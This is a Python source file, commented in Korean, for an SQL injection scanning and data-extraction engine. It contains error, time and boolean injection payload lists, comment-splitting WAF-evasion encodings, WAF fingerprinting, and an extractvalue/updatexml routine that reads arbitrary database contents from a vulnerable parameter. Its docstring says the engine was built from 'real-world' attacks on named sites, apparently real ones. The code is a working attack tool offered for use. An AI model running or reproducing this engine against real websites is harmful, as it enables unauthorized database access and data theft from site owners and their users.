"""
SQLi Engine — urimoney/healing-money 실전 경험으로 만든 SQL 인젝션 탐지/추출 엔진
지원: Error-based, Boolean-based, Time-based, Union-based
"""
from __future__ import annotations
import re
import time
from dataclasses import dataclass, field
from typing import Callable

from .http_probe import HttpProbe, ProbeResult


# ── 에러 패턴 (실전에서 수집한 것들) ────────────────────────────
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"mysql_fetch_array",
    r"mysql_num_rows",
    r"ORA-\d{5}",
    r"pg_query",
    r"sqlite_.*error",
    r"mssql_query",
    r"microsoft.*ole db.*sql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"1064.*sql syntax",
    r"table.*doesn.t exist",
    r"unknown column",
    r"extractvalue\(",
    r"updatexml\(",
    r"column count doesn.t match",
    r"syntax error.*line",
    r"supplied argument is not a valid.*result",
]

# ── 페이로드 목록 ─────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' AND 1=2--",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

TIME_PAYLOADS = [
    "' AND SLEEP(3)--",
    "' AND SLEEP(3)#",
    "1 AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)--",
    "1' AND BENCHMARK(5000000,MD5(1))--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1--", "1 AND 1=2--"),
]

# ── WAF 우회 인코딩 (urimoney 경험: 0x0a 뉴라인, MySQL 주석) ─────
WAF_BYPASSES = {
    "space": [
        lambda s: s.replace(" ", "/**/"),
        lambda s: s.replace(" ", "%0a"),
        lambda s: s.replace(" ", "%09"),
        lambda s: s.replace(" ", "+"),
    ],
    "keyword": [
        lambda s: re.sub(r'SELECT', 'SE/**/LECT', s, flags=re.I),
        lambda s: re.sub(r'UNION', 'UN/**/ION', s, flags=re.I),
        lambda s: re.sub(r'AND', 'AN/**/D', s, flags=re.I),
        lambda s: re.sub(r'OR', 'O/**/R', s, flags=re.I),
    ],
}


@dataclass
class SqliResult:
    url: str
    parameter: str
    method: str           # GET / POST
    vuln_type: str        # error / time / boolean / union
    payload: str
    evidence: str
    confidence: str       # high / medium / low
    waf_bypass_used: str = ""


@dataclass
class ScanResult:
    target: str
    vulns: list[SqliResult] = field(default_factory=list)
    tested_params: list[str] = field(default_factory=list)
    waf_detected: bool = False
    waf_type: str = ""
    duration: float = 0.0

    @property
    def vulnerable(self) -> bool:
        return len(self.vulns) > 0


class SqliScanner:
    def __init__(self, probe: HttpProbe, on_progress: Callable[[str], None] | None = None):
        self.probe = probe
        self.log = on_progress or (lambda s: None)

    def _detect_sql_error(self, body: str) -> str:
        for pat in SQL_ERROR_PATTERNS:
            m = re.search(pat, body, re.I)
            if m:
                return m.group(0)[:100]
        return ""

    def _detect_waf(self, url: str) -> tuple[bool, str]:
        """WAF/방화벽 탐지"""
        r = self.probe.get(url + "?test=<script>", timeout=8)
        if r.status == 403:
            return True, "Generic (403)"
        if r.status == 406:
            return True, "Nginx/OpenResty (406)"
        body = r.body.lower()
        if "cloudflare" in body:
            return True, "Cloudflare"
        if "sucuri" in body:
            return True, "Sucuri"
        if "mod_security" in body or "modsecurity" in body:
            return True, "ModSecurity"
        return False, ""

    def scan_get_param(self, url: str, param: str) -> list[SqliResult]:
        """GET 파라미터 SQLi 스캔"""
        results = []
        base_r = self.probe.get(url)
        base_body = base_r.body

        self.log(f"[SQLi] GET {url} param={param}")

        for payload in ERROR_PAYLOADS:
            injected = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
            r = self.probe.get(injected)
            evidence = self._detect_sql_error(r.body)
            if evidence:
                results.append(SqliResult(
                    url=url, parameter=param, method="GET",
                    vuln_type="error", payload=payload, evidence=evidence,
                    confidence="high",
                ))
                self.log(f"[!] ERROR-BASED SQLi: {param} → {evidence}")
                break

        # Time-based (도구가 막혀있을 때)
        if not results:
            for payload in TIME_PAYLOADS[:3]:
                t0 = time.time()
                injected = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
                self.probe.get(injected, timeout=10)
                elapsed = time.time() - t0
                if elapsed >= 2.5:
                    results.append(SqliResult(
                        url=url, parameter=param, method="GET",
                        vuln_type="time", payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s",
                        confidence="medium",
                    ))
                    self.log(f"[!] TIME-BASED SQLi: {param} ({elapsed:.1f}s delay)")
                    break

        # Boolean-based
        if not results:
            for (true_p, false_p) in BOOLEAN_PAYLOADS:
                r_true = self.probe.get(url.replace(f"{param}=", f"{param}={urllib.parse.quote(true_p)}"))
                r_false = self.probe.get(url.replace(f"{param}=", f"{param}={urllib.parse.quote(false_p)}"))
                if len(r_true.body) != len(r_false.body) and r_true.status == r_false.status:
                    results.append(SqliResult(
                        url=url, parameter=param, method="GET",
                        vuln_type="boolean", payload=true_p,
                        evidence=f"True body: {len(r_true.body)}b vs False: {len(r_false.body)}b",
                        confidence="medium",
                    ))
                    self.log(f"[!] BOOLEAN-BASED SQLi: {param}")
                    break

        return results

    def scan_post_param(self, url: str, data_template: dict, param: str) -> list[SqliResult]:
        """POST 파라미터 SQLi 스캔"""
        results = []
        self.log(f"[SQLi] POST {url} param={param}")

        for payload in ERROR_PAYLOADS[:6]:
            data = dict(data_template)
            data[param] = payload
            r = self.probe.post(url, data)
            evidence = self._detect_sql_error(r.body)
            if evidence:
                results.append(SqliResult(
                    url=url, parameter=param, method="POST",
                    vuln_type="error", payload=payload, evidence=evidence,
                    confidence="high",
                ))
                self.log(f"[!] ERROR-BASED POST SQLi: {param}")
                break

        # Time-based for POST
        if not results:
            for payload in TIME_PAYLOADS[:2]:
                data = dict(data_template)
                data[param] = payload
                t0 = time.time()
                self.probe.post(url, data, timeout=10)
                elapsed = time.time() - t0
                if elapsed >= 2.5:
                    results.append(SqliResult(
                        url=url, parameter=param, method="POST",
                        vuln_type="time", payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s",
                        confidence="medium",
                    ))
                    self.log(f"[!] TIME-BASED POST SQLi: {param} ({elapsed:.1f}s)")
                    break

        return results

    def extract_data(self, url: str, param: str, query: str = "SELECT database()") -> str:
        """Error-based 데이터 추출 (extractvalue 사용)"""
        payload = f"1' AND extractvalue(1,concat(0x7e,({query}),0x7e))--"
        r = self.probe.get(url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}"))
        m = re.search(r'~(.+?)~', r.body)
        if m:
            return m.group(1)
        # updatexml fallback
        payload2 = f"1' AND updatexml(1,concat(0x7e,({query})),1)--"
        r2 = self.probe.get(url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload2)}"))
        m2 = re.search(r'~(.+?)~', r2.body)
        return m2.group(1) if m2 else ""

    def full_scan(self, url: str) -> ScanResult:
        """URL에 대한 전체 SQLi 스캔"""
        t0 = time.time()
        result = ScanResult(target=url)

        # WAF 탐지
        waf, waf_type = self._detect_waf(url)
        result.waf_detected = waf
        result.waf_type = waf_type
        if waf:
            self.log(f"[WAF] {waf_type} 탐지됨")

        # URL 파라미터 추출
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            result.tested_params.append(param)
            vulns = self.scan_get_param(url, param)
            result.vulns.extend(vulns)

        result.duration = time.time() - t0
        return result


# urllib.parse 임포트 보완
import urllib.parse
